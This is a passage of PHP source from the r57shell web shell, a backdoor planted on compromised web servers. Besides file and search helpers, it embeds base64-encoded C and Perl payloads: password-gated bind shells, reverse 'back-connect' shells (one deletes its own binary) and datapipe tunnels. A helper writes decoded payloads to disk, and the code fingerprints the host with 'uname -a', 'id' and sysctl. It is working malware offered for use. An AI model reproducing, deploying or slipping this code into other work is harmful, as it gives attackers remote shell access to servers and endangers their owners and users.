
   if( $mode & 0x400 )
   {
       $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
   }

   if( $mode & 0x200 )
   {
       $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
   }

   $s=sprintf("%1s", $type);
   $s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
   $s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
   $s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);

return trim($s);
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0035
//


function in($type,$name,$size,$value,$checked=0)
{
   $ret = "<input type=".$type." name=".$name." ";

   if($size != 0)
  {
      $ret .= "size=".$size." ";
  }

   $ret .= "value=\"".$value."\"";

  if($checked)
  {
      $ret .= " checked";
  }

return $ret.">";
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0036
//


function which($pr)
{
  $path = ex("which $pr");

  if(!empty($path))
  {
     return $path;

  } else
  {
     return $pr;
  }
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0037
//


function cf($fname,$text)
{
  $w_file=@fopen($fname,"w") or err(0);

  if($w_file)
  {
     @fputs($w_file,@base64_decode($text));
     @fclose($w_file);
  }
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0038
//

function sr($l,$t1,$t2)
{

  return "<tr class=tr1><td class=td1 width=".$l."% align=right>".$t1."</td><td class=td1 align=left>".$t2."</td></tr>";

}

/******************************************************************************************************/
// FUNCTION_COED : FC-0039
//


if (!@function_exists("view_size"))
{

  function view_size($size)
  {
     if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
     elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
     elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
     else {$size = $size . " B";}
  return $size;
  }
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0040
//


function DirFilesR($dir,$types='')
{
  $files = Array();

  if(($handle = @opendir($dir)))
   {

     while (false !== ($file = @readdir($handle)))
     {

        if ($file != "." && $file != "..")
        {
           if(@is_dir($dir."/".$file))
           {
              $files = @array_merge($files,DirFilesR($dir."/".$file,$types));
           }
           else
               {
                 $pos = @strrpos($file,".");
                 $ext = @substr($file,$pos,@strlen($file)-$pos);

                 if($types)
                 {
                    if(@in_array($ext,explode(';',$types)))
                 {
                        $files[] = $dir."/".$file;
                 }
                 }
                 else
              {
                    $files[] = $dir."/".$file;
              }
           }
        }
     }

  @closedir($handle);
  }

return $files;
}


/******************************************************************************************************/
// FUNCTION_COED : FC-0041
//

class SearchResult
{
  var $text;
   var $FilesToSearch;
   var $ResultFiles;
   var $FilesTotal;
   var $MatchesCount;
   var $FileMatschesCount;
   var $TimeStart;
   var $TimeTotal;
   var $titles;



   /*
      @SearchResult
  */
  function SearchResult($dir,$text,$filter='')
   {

     $dirs = @explode(";",$dir);
     $this->FilesToSearch = Array();

     for($a=0;$a<count($dirs);$a++)
     {
          $this->FilesToSearch = @array_merge($this->FilesToSearch,DirFilesR($dirs[$a],$filter));
     }

     $this->text = $text;
     $this->FilesTotal = @count($this->FilesToSearch);
     $this->TimeStart = getmicrotime();
     $this->MatchesCount = 0;
     $this->ResultFiles = Array();
     $this->FileMatchesCount = Array();
     $this->titles = Array();
   }

   /*
      @GetFilesTotal
  */
   function GetFilesTotal()
  {
     return $this->FilesTotal;
  }

   /*
      @GetTitles
  */
   function GetTitles()
  {
     return $this->titles;
  }

   /*
      @GetTimeTotal
  */
   function GetTimeTotal()
  {
     return $this->TimeTotal;
  }

   /*
      @GetMatchesCount
  */
   function GetMatchesCount()
  {
     return $this->MatchesCount;
  }

   /*
      @GetFileMatchesCount
  */
   function GetFileMatchesCount()
  {
      return $this->FileMatchesCount;
  }

   /*
      @GetResultFiles
  */
   function GetResultFiles()
  {
      return $this->ResultFiles;
  }

   /*
      @SearchText
  */
   function SearchText($phrase=0,$case=0)
  {

       $qq = @explode(' ',$this->text);
       $delim = '|';

       if($phrase)
     {
           foreach($qq as $k=>$v)
        {
               $qq[$k] = '\b'.$v.'\b';
        }
     }

       $words = '('.@implode($delim,$qq).')';
       $pattern = "/".$words."/";

       if(!$case)
     {
           $pattern .= 'i';
     }

       foreach($this->FilesToSearch as $k=>$filename)
       {
           $this->FileMatchesCount[$filename] = 0;
           $FileStrings = @file($filename) or @next;

           for($a=0;$a<@count($FileStrings);$a++)
           {
               $count = 0;
               $CurString = $FileStrings[$a];
               $CurString = @Trim($CurString);
               $CurString = @strip_tags($CurString);
               $aa = '';

               if(($count = @preg_match_all($pattern,$CurString,$aa)))
               {
                   $CurString = @preg_replace($pattern,"<SPAN style='color: #990000;'><b>\\1</b></SPAN>",$CurString);
                   $this->ResultFiles[$filename][$a+1] = $CurString;
                   $this->MatchesCount += $count;
                   $this->FileMatchesCount[$filename] += $count;
               }
           }
       }
       $this->TimeTotal = @round(getmicrotime() - $this->TimeStart,4);
   }
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0042
//


function getmicrotime()
{
   list($usec,$sec) = @explode(" ",@microtime());

   return ((float)$usec + (float)$sec);
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0043
//


$port_bind_bd_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=";

/******************************************************************************************************/
// FUNCTION_COED : FC-0044
//

$port_bind_bd_pl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
lIENPTk47DQpleGl0IDA7DQp9DQp9";

/******************************************************************************************************/
// FUNCTION_COED : FC-0045
//

$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";

/******************************************************************************************************/
// FUNCTION_COED : FC-0046
//

$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";


/******************************************************************************************************/
// FUNCTION_COED : FC-0047
//

$datapipe_c="I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2
x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb
HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj
aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ
lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm
xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga
W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy
LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV
udCAqaDsNCiAgc3RydWN0IHNlcnZlbnQgKnM7DQogIGludCBuYnl0Ow0KICB1bnNpZ25lZCBsb25nIGE7DQogIHVuc2lnbmVkIHNob3J0IG9wb3J0Ow
0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb
iIsYXJndlswXSk7DQogICAgcmV0dXJuIDMwOw0KICB9DQogIGEgPSBpbmV0X2FkZHIoYXJndlszXSk7DQogIGlmICghKGggPSBnZXRob3N0YnluYW1l
KGFyZ3ZbM10pKSAmJg0KICAgICAgIShoID0gZ2V0aG9zdGJ5YWRkcigmYSwgNCwgQUZfSU5FVCkpKSB7DQogICAgcGVycm9yKGFyZ3ZbM10pOw0KICA
gIHJldHVybiAyNTsNCiAgfQ0KICBvcG9ydCA9IGF0b2woYXJndlsyXSk7DQogIGxhZGRyLnNpbl9wb3J0ID0gaHRvbnMoKHVuc2lnbmVkIHNob3J0KS
hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC
iAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBsYWRkci5zaW5fZmFtaWx5ID0gaHRvbnMoQUZfSU5FVCk7DQogIGxh
ZGRyLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKDApOw0KICBpZiAoYmluZChsc29jaywgJmxhZGRyLCBzaXplb2YobGFkZHIpKSkgew0KICAgIHBlcnJ
vcigiYmluZCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBpZiAobGlzdGVuKGxzb2NrLCAxKSkgew0KICAgIHBlcnJvcigibGlzdGVuIik7DQogIC
AgcmV0dXJuIDIwOw0KICB9DQogIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0gLTEpIHsNCiAgICBwZXJyb3IoImZvcmsiKTsNCiAgICByZXR1cm4gMjA7D
QogIH0NCiAgaWYgKG5ieXQgPiAwKQ0KICAgIHJldHVybiAwOw0KICBzZXRzaWQoKTsNCiAgd2hpbGUgKChjc29jayA9IGFjY2VwdChsc29jaywgJmNh
ZGRyLCAmY2FkZHJsZW4pKSAhPSAtMSkgew0KICAgIGNmaWxlID0gZmRvcGVuKGNzb2NrLCJyKyIpOw0KICAgIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0
gLTEpIHsNCiAgICAgIGZwcmludGYoY2ZpbGUsICI1MDAgZm9yazogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgICBzaHV0ZG93bihjc29jay
wyKTsNCiAgICAgIGZjbG9zZShjZmlsZSk7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgaWYgKG5ieXQgPT0gMCkNCiAgICAgIGdvdG8gZ290c
29jazsNCiAgICBmY2xvc2UoY2ZpbGUpOw0KICAgIHdoaWxlICh3YWl0cGlkKC0xLCBOVUxMLCBXTk9IQU5HKSA+IDApOw0KICB9DQogIHJldHVybiAy
MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA
gICBmcHJpbnRmKGNmaWxlLCAiNTAwIHNvY2tldDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICBvYWRkci
5zaW5fZmFtaWx5ID0gaC0+aF9hZGRydHlwZTsNCiAgb2FkZHIuc2luX3BvcnQgPSBodG9ucyhvcG9ydCk7DQogIG1lbWNweSgmb2FkZHIuc2luX2FkZ
HIsIGgtPmhfYWRkciwgaC0+aF9sZW5ndGgpOw0KICBpZiAoY29ubmVjdChvc29jaywgJm9hZGRyLCBzaXplb2Yob2FkZHIpKSkgew0KICAgIGZwcmlu
dGYoY2ZpbGUsICI1MDAgY29ubmVjdDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICB3aGlsZSAoMSkgew0
KICAgIEZEX1pFUk8oJmZkc3IpOw0KICAgIEZEX1pFUk8oJmZkc2UpOw0KICAgIEZEX1NFVChjc29jaywmZmRzcik7DQogICAgRkRfU0VUKGNzb2NrLC
ZmZHNlKTsNCiAgICBGRF9TRVQob3NvY2ssJmZkc3IpOw0KICAgIEZEX1NFVChvc29jaywmZmRzZSk7DQogICAgaWYgKHNlbGVjdCgyMCwgJmZkc3IsI
E5VTEwsICZmZHNlLCBOVUxMKSA9PSAtMSkgew0KICAgICAgZnByaW50ZihjZmlsZSwgIjUwMCBzZWxlY3Q6ICVzXG4iLCBzdHJlcnJvcihlcnJubykp
Ow0KICAgICAgZ290byBxdWl0MjsNCiAgICB9DQogICAgaWYgKEZEX0lTU0VUKGNzb2NrLCZmZHNyKSB8fCBGRF9JU1NFVChjc29jaywmZmRzZSkpIHs
NCiAgICAgIGlmICgobmJ5dCA9IHJlYWQoY3NvY2ssYnVmLDQwOTYpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgICBpZiAoKHdyaXRlKG9zb2NrLG
J1ZixuYnl0KSkgPD0gMCkNCglnb3RvIHF1aXQyOw0KICAgIH0gZWxzZSBpZiAoRkRfSVNTRVQob3NvY2ssJmZkc3IpIHx8IEZEX0lTU0VUKG9zb2NrL
CZmZHNlKSkgew0KICAgICAgaWYgKChuYnl0ID0gcmVhZChvc29jayxidWYsNDA5NikpIDw9IDApDQoJZ290byBxdWl0MjsNCiAgICAgIGlmICgod3Jp
dGUoY3NvY2ssYnVmLG5ieXQpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgfQ0KICB9DQoNCiBxdWl0MjoNCiAgc2h1dGRvd24ob3NvY2ssMik7DQo
gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm
lsZSk7DQogIHJldHVybiAwOw0KfQ==";

/******************************************************************************************************/
// FUNCTION_COED : FC-0048
//

$datapipe_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCnVzZSBQT1NJWDsNCiRsb2NhbHBvcnQgPSAkQVJHVlswXTsNCiRob3N0I
CAgICAgPSAkQVJHVlsxXTsNCiRwb3J0ICAgICAgPSAkQVJHVlsyXTsNCiRkYWVtb249MTsNCiRESVIgPSB1bmRlZjsNCiR8ID0gMTsNCmlmICgkZGFl
bW9uKXsgJHBpZCA9IGZvcms7IGV4aXQgaWYgJHBpZDsgZGllICIkISIgdW5sZXNzIGRlZmluZWQoJHBpZCk7IFBPU0lYOjpzZXRzaWQoKSBvciBkaWU
gIiQhIjsgfQ0KJW8gPSAoJ3BvcnQnID0+ICRsb2NhbHBvcnQsJ3RvcG9ydCcgPT4gJHBvcnQsJ3RvaG9zdCcgPT4gJGhvc3QpOw0KJGFoID0gSU86Ol
NvY2tldDo6SU5FVC0+bmV3KCdMb2NhbFBvcnQnID0+ICRsb2NhbHBvcnQsJ1JldXNlJyA9PiAxLCdMaXN0ZW4nID0+IDEwKSB8fCBkaWUgIiQhIjsNC
iRTSUd7J0NITEQnfSA9ICdJR05PUkUnOw0KJG51bSA9IDA7DQp3aGlsZSAoMSkgeyANCiRjaCA9ICRhaC0+YWNjZXB0KCk7IGlmICghJGNoKSB7IHBy
aW50IFNUREVSUiAiJCFcbiI7IG5leHQ7IH0NCisrJG51bTsNCiRwaWQgPSBmb3JrKCk7DQppZiAoIWRlZmluZWQoJHBpZCkpIHsgcHJpbnQgU1RERVJ
SICIkIVxuIjsgfSANCmVsc2lmICgkcGlkID09IDApIHsgJGFoLT5jbG9zZSgpOyBSdW4oXCVvLCAkY2gsICRudW0pOyB9IA0KZWxzZSB7ICRjaC0+Y2
xvc2UoKTsgfQ0KfQ0Kc3ViIFJ1biB7DQpteSgkbywgJGNoLCAkbnVtKSA9IEBfOw0KbXkgJHRoID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KCdQZWVyQ
WRkcicgPT4gJG8tPnsndG9ob3N0J30sJ1BlZXJQb3J0JyA9PiAkby0+eyd0b3BvcnQnfSk7DQppZiAoISR0aCkgeyBleGl0IDA7IH0NCm15ICRmaDsN
CmlmICgkby0+eydkaXInfSkgeyAkZmggPSBTeW1ib2w6OmdlbnN5bSgpOyBvcGVuKCRmaCwgIj4kby0+eydkaXInfS90dW5uZWwkbnVtLmxvZyIpIG9
yIGRpZSAiJCEiOyB9DQokY2gtPmF1dG9mbHVzaCgpOw0KJHRoLT5hdXRvZmx1c2goKTsNCndoaWxlICgkY2ggfHwgJHRoKSB7DQpteSAkcmluID0gIi
I7DQp2ZWMoJHJpbiwgZmlsZW5vKCRjaCksIDEpID0gMSBpZiAkY2g7DQp2ZWMoJHJpbiwgZmlsZW5vKCR0aCksIDEpID0gMSBpZiAkdGg7DQpteSgkc
m91dCwgJGVvdXQpOw0Kc2VsZWN0KCRyb3V0ID0gJHJpbiwgdW5kZWYsICRlb3V0ID0gJHJpbiwgMTIwKTsNCmlmICghJHJvdXQgICYmICAhJGVvdXQp
IHt9DQpteSAkY2J1ZmZlciA9ICIiOw0KbXkgJHRidWZmZXIgPSAiIjsNCmlmICgkY2ggJiYgKHZlYygkZW91dCwgZmlsZW5vKCRjaCksIDEpIHx8IHZ
lYygkcm91dCwgZmlsZW5vKCRjaCksIDEpKSkgew0KbXkgJHJlc3VsdCA9IHN5c3JlYWQoJGNoLCAkdGJ1ZmZlciwgMTAyNCk7DQppZiAoIWRlZmluZW
QoJHJlc3VsdCkpIHsNCnByaW50IFNUREVSUiAiJCFcbiI7DQpleGl0IDA7DQp9DQppZiAoJHJlc3VsdCA9PSAwKSB7IGV4aXQgMDsgfQ0KfQ0KaWYgK
CR0aCAgJiYgICh2ZWMoJGVvdXQsIGZpbGVubygkdGgpLCAxKSAgfHwgdmVjKCRyb3V0LCBmaWxlbm8oJHRoKSwgMSkpKSB7DQpteSAkcmVzdWx0ID0g
c3lzcmVhZCgkdGgsICRjYnVmZmVyLCAxMDI0KTsNCmlmICghZGVmaW5lZCgkcmVzdWx0KSkgeyBwcmludCBTVERFUlIgIiQhXG4iOyBleGl0IDA7IH0
NCmlmICgkcmVzdWx0ID09IDApIHtleGl0IDA7fQ0KfQ0KaWYgKCRmaCAgJiYgICR0YnVmZmVyKSB7KHByaW50ICRmaCAkdGJ1ZmZlcik7fQ0Kd2hpbG
UgKG15ICRsZW4gPSBsZW5ndGgoJHRidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJHRoLCAkdGJ1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+I
DApIHskdGJ1ZmZlciA9IHN1YnN0cigkdGJ1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfQ0Kd2hpbGUgKG15ICRs
ZW4gPSBsZW5ndGgoJGNidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJGNoLCAkY2J1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+IDApIHskY2J
1ZmZlciA9IHN1YnN0cigkY2J1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfX19DQo=";

/******************************************************************************************************/
// FUNCTION_COED : FC-0049
//

if($unix)
{
    if(!isset($_COOKIE['uname']))
	{
	    $uname = ex('uname -a'); setcookie('uname',$uname);
	}
	else
	{
	    $uname = $_COOKIE['uname'];
	}

    if(!isset($_COOKIE['id']))
	{
	    $id = ex('id'); setcookie('id',$id);
	}
	else
	{
	    $id = $_COOKIE['id'];
	}

    if($safe_mode)
	{
	    $sysctl = '-';
	}
    else if(isset($_COOKIE['sysctl']))
	{
	    $sysctl = $_COOKIE['sysctl'];
	}
    else
    {
        $sysctl = ex('sysctl -n kern.ostype && sysctl -n kern.osrelease');

        if(empty($sysctl))
		{
		    $sysctl = ex('sysctl -n kernel.ostype && sysctl -n kernel.osrelease');
		}

        if(empty($sysctl)) { $sysctl = '-'; }
		{
            setcookie('sysctl',$sysctl);
		}
    }
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0050
//

// 첫번째 칸 테이블 크기 조절
echo $head;
echo '</head>';
echo '<body><table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc width=160><font face=Verdana size=2>'.ws(2).'<font face=Webdings size=6><b>!</b></font><b>'.ws(2).'r57shell '.$version.'</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2>';
echo ws(2)."<b>".date ("d-m-Y H:i:s")."</b>";
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpinfo title=\"".$lang[$language.'_text46']."\"><b>phpinfo</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpini title=\"".$lang[$language.'_text47']."\"><b>php.ini</b></a> ".$rb;

/******************************************************************************************************/
// FUNCTION_COED : FC-0051
//


if($unix)
{
    echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?cpu title=\"".$lang[$language.'_text50']."\"><b>cpu</b></a> ".$rb;
    echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?mem title=\"".$lang[$language.'_text51']."\"><b>mem</b></a> ".$rb;
    echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?users title=\"".$lang[$language.'_text95']."\"><b>users</b></a> ".$rb;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0052
//


echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?tmp title=\"".$lang[$language.'_text48']."\"><b>tmp</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?delete title=\"".$lang[$language.'_text49']."\"><b>delete</b></a> ".$rb."<br>";

/******************************************************************************************************/
// FUNCTION_COED : FC-0053
//


echo ws(2)."safe_mode: <b>";
echo (($safe_mode)?("<font color=green>ON</font>"):("<font color=red>OFF</font>"));
echo "</b>".ws(2);

/******************************************************************************************************/
// FUNCTION_COED : FC-0054
//


echo "PHP version: <b>".@phpversion()."</b>";
$curl_on = @function_exists('curl_version');
echo ws(2);
echo "cURL: <b>".(($curl_on)?("<font color=green>ON</font>"):("<font color=red>OFF</font>"));
echo "</b>".ws(2);

/******************************************************************************************************/
// FUNCTION_COED : FC-0055
//

echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');

if($mysql_on)
{
    echo "<font color=green>ON</font>";
}
else
{
    echo "<font color=red>OFF</font>";
}
echo "</b>".ws(2);

/******************************************************************************************************/
// FUNCTION_COED : FC-0056
//

echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');

if($mssql_on)
{
    echo "<font color=green>ON</font>";
}
else
{
